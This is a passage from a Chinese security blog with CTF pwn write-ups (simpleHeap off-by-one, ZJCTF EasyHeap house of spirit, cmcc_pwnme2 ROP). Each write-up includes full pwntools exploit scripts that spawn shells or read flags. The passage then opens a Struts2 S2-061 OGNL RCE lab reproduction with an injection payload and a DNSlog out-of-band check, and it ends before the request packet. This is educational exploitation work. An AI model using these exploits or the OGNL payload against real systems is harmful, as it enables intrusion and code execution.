<h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>sub_AB2函数含义是到note_list里寻找第一个空闲的对序号给v1，没有可用的就返回-1，最多申请10个chunk。之后输入的是chunk的大小，最大是111，也就是0x6F，加上chunk头是0x7F，也就是申请的堆只能fastbin大小。</p>
<p>modify函数存在off-by-one，因为i从0开始，条件应该是i&gt;=size时break，而不是i&gt;size。</p>
<p>delete函数没有存在漏洞，指针该置0的都已置0了。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><p>可以利用chunk overlapping，通过chunk的复用规则以及off-by-one造成的chunk overlapping，可以通过分割造成unsortedbin以及Double link。</p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./simpleHeap'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">io=process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"choice: "</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">    io.sendline(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"choice: "</span>,<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">    io.sendline(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"choice: "</span>,<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"choice: "</span>,<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------leak libc----------#</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span> )<span class="comment">#0</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'BBBB'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'CCCC'</span> )<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'DDDD'</span> )<span class="comment">#3</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x18</span> + <span class="string">'\xe1'</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'BBBB '</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"><span class="comment">#----------fastbin attack------------#</span></span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">malloc_hook = libc_base + libc .symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">fake_chunk = malloc_hook<span class="number">-0x23</span></span><br><span class="line">libc_one_gadget = [<span class="number">0x45216</span> , <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base + libc_one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'clean bin'</span>)<span class="comment">#4 and 2</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">payload = p64(fake_chunk)</span><br><span class="line">edit(<span class="number">2</span>, payload )</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'AAAA'</span> )<span class="comment">#4</span></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x13</span> - <span class="number">0x8</span>) + p64(one_gadget) + p64(realloc+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span> , payload)</span><br><span class="line"><span class="comment">#-----------get shell--------------#</span></span><br><span class="line">io.sendlineafter(<span class="string">"choice: "</span>, <span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"size?"</span>, <span class="string">'10'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p><a href="https://github.com/As1def/ctf-challenges/tree/master/pwn/heap/off_by_one/%5BV%26N2020%5D-simpleHeap" target="_blank" rel="noopener">题目附件</a></p>
<h2 id="ZJCTF-EasyHeap"><a href="#ZJCTF-EasyHeap" class="headerlink" title="ZJCTF-EasyHeap"></a>ZJCTF-EasyHeap</h2><h4 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">--------------------------------</span><br><span class="line"><span class="code">       Easy Heap Creator       </span></span><br><span class="line">--------------------------------</span><br><span class="line"><span class="code"> 1. Create a Heap               </span></span><br><span class="line"><span class="code"> 2. Edit a Heap                 </span></span><br><span class="line"><span class="code"> 3. Delete a Heap               </span></span><br><span class="line"><span class="code"> 4. Exit                        </span></span><br><span class="line">--------------------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure></div>

<p>create_heap函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">create_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !heaparray[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size of Heap : "</span>);</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">      <span class="built_in">size</span> = atoi(&amp;buf);</span><br><span class="line">      heaparray[i] = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !heaparray[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Allocate Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Content of heap:"</span>, &amp;buf);</span><br><span class="line">      read_input(heaparray[i], <span class="built_in">size</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"SuccessFul"</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MATLAB"><figure class="iseeu highlight /matlab"><table><tr><td class="code"><pre><span class="line">heaparray[<span class="built_in">i</span>] = malloc(<span class="built_in">size</span>);</span><br><span class="line">read_input(heaparray[<span class="built_in">i</span>], <span class="built_in">size</span>);</span><br></pre></td></tr></table></figure></div>

<ul>
<li>heaparray[i]：存放的是chunk的地址。</li>
<li>read_input(heaparray[i], size)：向chunk写入size大小的内容。</li>
</ul>
<p>edit函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>LL);</span><br><span class="line">  v2 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( heaparray[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Size of Heap : "</span>, &amp;buf);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    v0 = atoi(&amp;buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content of heap : "</span>, &amp;buf);</span><br><span class="line">    read_input(heaparray[v2], v0);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No such heap !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">read_input(heaparray[v2], v0);</span><br></pre></td></tr></table></figure></div>

<ul>
<li>read_input(heaparray[v2], v0)：向chunk中写入 v0 大小的内容，也就是说如果v0比create时size大就会造成堆溢出。</li>
</ul>
<p>delete_heap函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>LL);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( heaparray[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(heaparray[v1]);</span><br><span class="line">    heaparray[v1] = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No such heap !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>free掉对应的chunk后指针置零，不存在UAF。</li>
</ul>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ul>
<li>首先可以创建3个chunk，chunk(0,1,2)，chunk 1内容为 /bin/sh。</li>
<li>可以利用 <code>house of spirit</code> 技术，伪造 <code>chunk</code> 至 <code>heaparray</code> 附近，这样利用的话我们需要在 <code>malloc fastbin</code> 时进行绕过大小判断，这里巧妙利用了地址开头为 <code>7f</code> 来伪造大小为 0x70 的 <code>fastbin</code>。</li>
</ul>
<p><img src="/images/PWN/QQ20200613200343.png" alt="QQ20200613200343.png"></p>
<ul>
<li>接下来通过伪造的 <code>fastbin</code> 输入内容覆盖 <code>chunk 0</code> 的地址为<code>free_got</code> 的地址。</li>
<li>然后通过edit <code>chunk 0</code>将 <code>free_got</code> 地址改为 <code>system</code> 的地址。</li>
<li>至此，当 <code>free chunk 1</code> 时就会执行 system(‘/bin/sh’) 拿到shell。</li>
</ul>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./easyheap'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">io=process(binary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=remote("node3.buuoj.cn",26413)</span></span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x,drop=<span class="literal">True</span>   :io.recvuntil(x,drop)</span><br><span class="line">rv=<span class="keyword">lambda</span> x             :io.recv(x)</span><br><span class="line">slt=<span class="keyword">lambda</span> x,n          :io.sendlineafter(x,n)</span><br><span class="line">sl=<span class="keyword">lambda</span> x             :io.sendline(x)</span><br><span class="line">sd=<span class="keyword">lambda</span> x             :io.send(x)</span><br><span class="line">irt=<span class="keyword">lambda</span>              :io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    slt(<span class="string">"choice :"</span>,<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Heap :"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"heap:"</span>)</span><br><span class="line">    sl(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    slt(<span class="string">"choice :"</span>,<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Index :"</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">"Heap :"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"heap :"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    slt(<span class="string">"choice :"</span>,<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Index :"</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    slt(<span class="string">"choice :"</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'aaa'</span>)  <span class="comment">#chunk 0</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'bbb'</span>)  <span class="comment">#chunk 1</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'/bin/sh'</span>)  <span class="comment">#chunk 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause() </span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020b0</span><span class="number">-3</span>)</span><br><span class="line">edit(<span class="number">1</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'ccc'</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'ddd'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag_addr=0x400C23 #/home/pwn/flag 不存在</span></span><br><span class="line"></span><br><span class="line">system_addr=elf.plt[<span class="string">'system'</span>]</span><br><span class="line">free_got=elf.got[<span class="string">'free'</span>]</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(free_got)</span><br><span class="line">edit(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload=p64(system_addr)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure></div>

<p><a href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap" target="_blank" rel="noopener">题目来源</a></p>
<h2 id="cmcc-pwnme2"><a href="#cmcc-pwnme2" class="headerlink" title="cmcc-pwnme2"></a>cmcc-pwnme2</h2><p>main函数</p>
<p><img src="/images/cmcc_pwnme2/image-20200611202141386.png" alt=""></p>
<p>userfunction()</p>
<p><img src="/images/cmcc_pwnme2/image-20200611202258205.png" alt="image-20200611202258205"></p>
<p>add_home()</p>
<p><img src="/images/cmcc_pwnme2/image-20200611202349086.png" alt="image-20200611202349086"></p>
<p>add_flag()</p>
<p><img src="/images/cmcc_pwnme2/image-20200611202406100.png" alt="image-20200611202406100"></p>
<p>exec_string()</p>
<p><img src="/images/cmcc_pwnme2/image-20200611202437146.png" alt="image-20200611202437146"></p>
<p>漏洞还是很好找的，strcpy造成了栈溢出。exec_string函数会读入路径为string的内容并输出。通过add_home()和add_flag()刚好拼接出’/home/flag’字符串到string，一些条件限制也可以绕过。</p>
<blockquote>
<p>pwndbg&gt; x/s  0x0804A060<br>0x804a060  <string>:             “flag”</p>
</blockquote>
<p>首先利用拼接路径读取flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./pwnme2'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(binary)</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29666</span>)</span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x,drop=<span class="literal">True</span>   :io.recvuntil(x,drop)</span><br><span class="line">rv=<span class="keyword">lambda</span> x   :io.recv(x)</span><br><span class="line">sl=<span class="keyword">lambda</span> x   :io.sendline(x)</span><br><span class="line">sd=<span class="keyword">lambda</span> x   :io.send(x)</span><br><span class="line">irt=<span class="keyword">lambda</span>    :io.interactive()</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x0804873C</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_ebp=<span class="number">0x08048680</span></span><br><span class="line">pop_rdi_ebp_ret=<span class="number">0x0804867f</span></span><br><span class="line">add_home=<span class="number">0x8048644</span></span><br><span class="line">add_flag=<span class="number">0x8048682</span></span><br><span class="line">exec_string=<span class="number">0x80485CB</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">"input:"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x6C</span>+<span class="string">'bbbb'</span></span><br><span class="line">payload+=p32(add_home)</span><br><span class="line">payload+=p32(pop_ebp)</span><br><span class="line">payload+=p32(<span class="number">0xDEADBEEF</span>)</span><br><span class="line">payload+=p32(add_flag)</span><br><span class="line">payload+=p32(pop_rdi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line">payload+=p32(<span class="number">0xABADF00D</span>)</span><br><span class="line">payload+=p32(exec_string)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure></div>

<p><img src="/images/cmcc_pwnme2/image-20200611203400619.png" alt="image-20200611203400619"></p>
<p>发现服务器上并没有这个路径的flag</p>
<p>我们可以试着通过调用gets，输入flag路径到string,再返回exec_string</p>
<p>这里直接试着输入flag，成功</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./pwnme2'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(binary)</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29666</span>)</span><br><span class="line">ru=<span class="keyword">lambda</span> x,drop=<span class="literal">True</span>   :io.recvuntil(x,drop)</span><br><span class="line">rv=<span class="keyword">lambda</span> x   :io.recv(x)</span><br><span class="line">sl=<span class="keyword">lambda</span> x   :io.sendline(x)</span><br><span class="line">sd=<span class="keyword">lambda</span> x   :io.send(x)</span><br><span class="line">irt=<span class="keyword">lambda</span>    :io.interactive()</span><br><span class="line"></span><br><span class="line">exec_string=<span class="number">0x80485CB</span></span><br><span class="line">gets=elf.plt[<span class="string">'gets'</span>]</span><br><span class="line">string=<span class="number">0x804A060</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x6c</span>+<span class="string">'bbbb'</span></span><br><span class="line">payload+=p32(gets)</span><br><span class="line">payload+=p32(exec_string)</span><br><span class="line">payload+=p32(string)</span><br><span class="line">ru(<span class="string">"input:"</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure></div>

<p><a href="https://buuoj.cn/challenges#cmcc_pwnme2" target="_blank" rel="noopener">题目来源</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2 S2-061 远程命令执行</title>
    <url>/2021/01/17/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>在 Apache Struts 多个版本中，如果开发人员使用% { … }语法强制应用 OGNL 计算，则某些tag属性可以执行双重计算。对不受信任的用户输入使用强制的 OGNL 计算可能导致远程代码执行。</p>
<a id="more"></a>

<h3 id="Struts2-S2-061-远程命令执行漏洞（CVE-2020-17530）"><a href="#Struts2-S2-061-远程命令执行漏洞（CVE-2020-17530）" class="headerlink" title="Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）"></a>Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）</h3><h4 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h4><p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露  S2-061 Struts 远程代码执行漏洞，开发人员使用了 %{…} 语法，从而攻击者可以通过构Payload，从而造成远程代码执行。</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Apache Struts2：2.0.0 - 2.5.25</p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">项目地址：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/vulhub/</span>vulhub<span class="regexp">/tree/m</span>aster<span class="regexp">/struts2/</span>s2-<span class="number">061</span></span><br><span class="line">环境启动：docker-compose up -d</span><br></pre></td></tr></table></figure></div>

<p>访问漏洞环境：</p>
<p><img src="https://i.loli.net/2021/04/17/WfIlEwyS2P8YGud.png" alt="image-20210417212256886"></p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="验证漏洞存在"><a href="#验证漏洞存在" class="headerlink" title="验证漏洞存在"></a>验证漏洞存在</h5><p>%25%7b+%27As1def%27+%2b+(520+%2b+520).toString()%7d</p>
<p><img src="https://i.loli.net/2021/04/17/bS2A3dIVfmiwNty.png" alt="image-20210417214608015"></p>
<p>执行效果</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line">http://your-ip:8080/?id=%25%7b+%27As1def%27+%2b+(520+%2b+520).toString()%7d</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/17/GVR1Kgux7jqrzYW.png" alt="image-20210417214718672"></p>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><h6 id="DNSlog出网验证"><a href="#DNSlog出网验证" class="headerlink" title="DNSlog出网验证"></a>DNSlog出网验证</h6><p>通过<code>http://dnslog.cn/</code>生成域名：yctiz4.dnslog.cn</p>
<p><img src="https://i.loli.net/2021/04/17/AkvCpXWVaEI19x7.png" alt="image-20210417214934887"></p>
<p>利用请求包=&gt;</p>
